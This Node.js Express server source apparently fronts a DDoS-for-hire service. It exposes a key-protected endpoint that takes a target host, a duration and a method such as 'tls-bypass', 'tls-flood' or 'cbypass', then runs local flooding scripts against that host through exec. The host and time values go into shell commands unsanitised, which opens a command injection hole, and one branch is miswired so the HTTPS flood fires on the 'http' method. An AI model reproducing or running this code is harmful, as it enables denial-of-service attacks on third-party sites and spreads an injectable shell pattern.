const express = require('express');
const { exec } = require('child_process');

const app = express();
const port = 80;
let lastAPICallTime = Date.now();
app.get('/api.lukaku', (req, res) => {
  const currentTime = Date.now();
  const cooldown = 120 * 1000
  const clientIP = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
  const { key, host, time, method } = req.query;
  console.log(`IP Connect: ${clientIP}`)
  if (!key || !host || !time || !method) {
    const err_u = {
      error: `true`,
      message: `[URL] Not Found`,
      code: '410'
    };
    return res.status(400).send(err_u);
  }

  if (key !== 'bolo') {
    const err_key = {
      message: `[Key] Error`,
      code: '401'
    };
    return res.status(401).send(err_key);
  }

  if (time > 60) {
    const err_time = {
      message: `[Time] Invalid`,
      code: '400'
    };
    return res.status(400).send(err_time);
  }

  if (!host) {
    const err_host = {
      message: `[Host] Not Found`,
      code: '404'
    };
    return res.status(404).send(err_host);
  }

  if (
    !(
      method.toLowerCase() === 'tls-bypass' ||
      method.toLowerCase() === 'tls-flood' ||
      method.toLowerCase() === 'browser' ||
      method.toLowerCase() === 'http' ||
      method.toLowerCase() === 'cbypass' ||
      method.toLowerCase() === 'https' ||
      method.toLowerCase() === 'wtf'
    )
  ) {
    const err_method = {
      message: `[Method] Not Found`,
      method_valid: `TLS-BYPASS | TLS-FLOOD | BROWSER | HTTP (Comming soon) | CBYPASS | HTTPS`,
      code: '403'
    };
    return res.status(403).send(err_method);
  }
  if (currentTime - lastAPICallTime < cooldown) {
    const err_cooldown = {
      message: `[Cooldown] Please wait for ${Math.ceil((cooldown - (currentTime - lastAPICallTime)) / 1000)} seconds.`,
      time_api: `${Math.ceil((cooldown - (currentTime - lastAPICallTime)) / 1000)}s`,
      code: '429'
    };
    return res.status(429).send(err_cooldown);
  }

  const jsonData = {
    error: `false`,
    message: `Success`,
    host: `${host}`,
    time: `${time}`,
    method: `${method}`,
    code: '200'
  };
  res.status(200).send(jsonData);
  lastAPICallTime = currentTime;
  if (method.toLowerCase() === 'tls-bypass') {
    exec(`node TLS-BYPASS ${host} ${time} 100 20`, (error, stdout, stderr) => {
      if (error) {
        console.error(`Error: ${error.message}`);
        return;
      }
      if (stderr) {
        console.error(`stderr: ${stderr}`);
        return;
      }
      console.log('[${clientIP}] Command [TLS-BYPASS] executed successfully');
    });
  }
  if (method.toLowerCase() === 'tls-flood') {
    exec(`node TLS-FLOOD ${host} ${time} 100 20`, (error, stdout, stderr) => {
      if (error) {
        console.error(`Error: ${error.message}`);
        return;
      }
      if (stderr) {
        console.error(`stderr: ${stderr}`);
        return;
      }
      console.log('[${clientIP}] Command [TLS-FLOOD] executed successfully');
    });
  }
  if (method.toLowerCase() === 'browser') {
    exec(`node browser ${host} ${time}`, (error, stdout, stderr) => {
      if (error) {
        console.error(`Error: ${error.message}`);
        return;
      }
      if (stderr) {
        console.error(`stderr: ${stderr}`);
        return;
      }
      console.log('[${clientIP}] Command [BROWSER] executed successfully');
    });
  }
  if (method.toLowerCase() === 'cbypass') {
    exec(`node DNK ${host} ${time} 100 40 proxy.txt`, (error, stdout, stderr) => {
      if (error) {
        console.error(`Error: ${error.message}`);
        return;
      }
      if (stderr) {
        console.error(`stderr: ${stderr}`);
        return;
      }
      console.log('[${clientIP}] Command [CBYPASS] executed successfully');
    });
  }
  if (method.toLowerCase() === 'http') {
    exec(`node HTTP ${host} ${time} 75 35`, (error, stdout, stderr) => {
      if (error) {
        console.error(`Error: ${error.message}`);
        return;
      }
      if (stderr) {
        console.error(`stderr: ${stderr}`);
        return;
      }
      console.log('[${clientIP}] Command [HTTP] executed successfully');
    });
  }
  if (method.toLowerCase() === 'http') {
    exec(`node HTTPS ${host} ${time} 100 25 proxy.txt`, (error, stdout, stderr) => {
      if (error) {
        console.error(`Error: ${error.message}`);
        return;
      }
      if (stderr) {
        console.error(`stderr: ${stderr}`);
        return;
      }
      console.log('[${clientIP}] Command [HTTPS] executed successfully');
    });
  }
});



app.listen(port, () => {
  console.log(`Server is running on http://localhost:${port}`);
});
